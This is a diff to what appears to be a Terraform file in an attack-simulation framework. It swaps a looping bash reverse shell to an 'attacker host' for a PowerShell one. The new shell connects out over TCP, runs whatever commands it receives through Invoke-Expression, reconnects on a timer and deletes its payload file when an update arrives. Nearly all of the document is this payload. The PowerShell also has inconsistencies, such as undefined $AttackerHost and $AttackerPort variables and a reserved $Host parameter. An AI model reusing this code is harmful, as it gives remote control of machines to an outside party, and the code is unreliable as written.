@@ -1,51 +1,122 @@
 locals {
     host_ip = var.inputs["host_ip"]
     host_port = var.inputs["host_port"]
-
+    
     payload = <<-EOT
-    log "attacker Host: ${local.host_ip}:${local.host_port}"
-    server="${local.host_ip}"
-    timeout=600
-    start_time=$(date +%s)
-    # Check if $server is an IP address
-    if [[ $server =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
-        log "server is set to IP address $server, no need to resolve DNS"
-    else
-        log "checking dns resolution: $server"
-        while true; do
-            ip=$(dig +short $server)
-            if [ -z "$ip" ]; then  # If $ip is empty, the domain hasn't resolved yet
-                current_time=$(date +%s)
-                elapsed_time=$((current_time - start_time))
-                if [ $elapsed_time -gt $timeout ]; then
-                    echo "DNS resolution for $server timed out after $timeout seconds"
-                    exit 1
-                fi
-                sleep 1
-            else
-                echo "$server resolved to $ip"
+    Write-Log "attacker Host: ${local.host_ip}:${local.host_port}"
+    $Server="${local.host_ip}"
+    $Timeout=600
+    $StartTime = Get-Date
+    $PayloadPath = "$env:TEMP\payload_${var.inputs["tag"]}.ps1"
+
+    # DNS Resolution
+    if ($AttackerHost -match '^\d{1,3}(\.\d{1,3}){3}$') {
+        Write-Log "Server is set to IP address $AttackerHost, no need to resolve DNS."
+    } else {
+        Write-Log "Checking DNS resolution: $AttackerHost"
+        while ($true) {
+            $ResolvedIP = [System.Net.Dns]::GetHostAddresses($AttackerHost)
+            if ($null -eq $ResolvedIP) {
+                if ((New-TimeSpan -Start $StartTime).TotalSeconds -gt $Timeout) {
+                    Write-Log "DNS resolution for $AttackerHost timed out after $Timeout seconds."
+                    Exit 1
+                }
+                Start-Sleep -Seconds 1
+            } else {
+                Write-Log "$AttackerHost resolved to $($ResolvedIP -join ', ')"
                 break
-            fi
-        done
-    fi
-    START_HASH=$(sha256sum --text /tmp/payload_$SCRIPTNAME | awk '{ print $1 }')
-    while true; do
-        kill -9 $(ps aux | grep '/bin/bash -c bash -i' | head -1 | awk '{ print $2 }')
-        log "running: /bin/bash -c 'bash -i >& /dev/tcp/${local.host_ip}/${local.host_port} 0>&1'"
-        while ! /bin/bash -c 'bash -i >& /dev/tcp/${local.host_ip}/${local.host_port} 0>&1'; do
-            log "reconnecting: ${local.host_ip}:${local.host_port}";
-            sleep 10;
-        done;
-        log 'waiting 30 minutes...';
-        sleep 1800
-        if ! check_payload_update /tmp/payload_$SCRIPTNAME $START_HASH; then
-            log "payload update detected - exiting loop and forcing payload download"
-            rm -f /tmp/payload_$SCRIPTNAME
+            }
+        }
+    }
+    $StartHash = if (Test-Path $PayloadPath) { Get-FileHash -Path $PayloadPath -Algorithm SHA256 | Select-Object -ExpandProperty Hash } else { "" }
+    
+    # Function to check if payload is updated
+    function Check-PayloadUpdate {
+        param([string]$Path, [string]$StartHash)
+        if (-Not (Test-Path $Path)) {
+            return $false
+        }
+        $CurrentHash = Get-FileHash -Path $Path -Algorithm SHA256 | Select-Object -ExpandProperty Hash
+        return $CurrentHash -ne $StartHash
+    }
+
+    function Start-ReverseShell {
+        param([string]$Host, [int]$Port, [int]$LifetimeMinutes = 30)
+        Write-Log "Starting reverse shell with a forced lifetime of $LifetimeMinutes minutes."
+
+        $EndTime = (Get-Date).AddMinutes($LifetimeMinutes)
+
+        while ((Get-Date) -lt $EndTime) {
+            try {
+                # Start the reverse shell in the background as a job
+                $Job = Start-Job -ScriptBlock {
+                    param($Host, $Port)
+                    try {
+                        # Reverse shell launcher, matching the provided sample
+                        $TCPClient = New-Object Net.Sockets.TCPClient($Host, $Port)
+                        $NetworkStream = $TCPClient.GetStream()
+                        $StreamWriter = New-Object IO.StreamWriter($NetworkStream)
+                        function WriteToStream ($String) {
+                            [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | ForEach-Object {0}
+                            $StreamWriter.Write($String + 'SHELL> ')
+                            $StreamWriter.Flush()
+                        }
+                        WriteToStream ''
+
+                        while (($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
+                            $Command = ([Text.Encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)
+                            $Output = try {
+                                Invoke-Expression $Command 2>&1 | Out-String
+                            } catch {
+                                $_ | Out-String
+                            }
+                            WriteToStream $Output
+                        }
+                        $StreamWriter.Close()
+                    } catch {
+                        # Handle exceptions gracefully
+                        "Reverse shell encountered an error: $_"
+                    } finally {
+                        $TCPClient?.Close()
+                    }
+                } -ArgumentList $Host, $Port
+
+                Write-Log "Reverse shell job started with ID $($Job.Id)."
+                
+                # Wait for the specified lifetime or until the job completes
+                Start-Sleep -Seconds ($LifetimeMinutes * 60)
+
+                Write-Log "Killing reverse shell job (ID $($Job.Id)) after $LifetimeMinutes minutes."
+                Stop-Job -Job $Job -Force
+                Remove-Job -Job $Job
+
+            } catch {
+                Write-Log "Failed to start reverse shell: $_"
+            }
+
+            Write-Log "Restarting reverse shell after delay..."
+            Start-Sleep -Seconds 10
+        }
+
+        Write-Log "Reverse shell lifetime expired. Exiting function."
+    }
+
+    # Main loop
+    while ($true) {
+        Write-Log "Starting reverse shell connection..."
+        Start-ReverseShell -Host $AttackerHost -Port $AttackerPort -LifetimeMinutes 30
+
+        Write-Log "Sleeping for 30 minutes..."
+        Start-Sleep -Seconds 1800
+
+        if (Check-PayloadUpdate -Path $PayloadPath -StartHash $StartHash) {
+            Write-Log "Payload update detected - exiting loop to force payload download."
+            Remove-Item -Path $PayloadPath -Force -ErrorAction SilentlyContinue
             break
-        else
-            log "restarting loop..."
-        fi
-    done
+        } else {
+            Write-Log "Restarting loop..."
+        }
+    }
     EOT
 
     base64_payload = templatefile("${path.module}/../../delayed_start.sh", { config = {
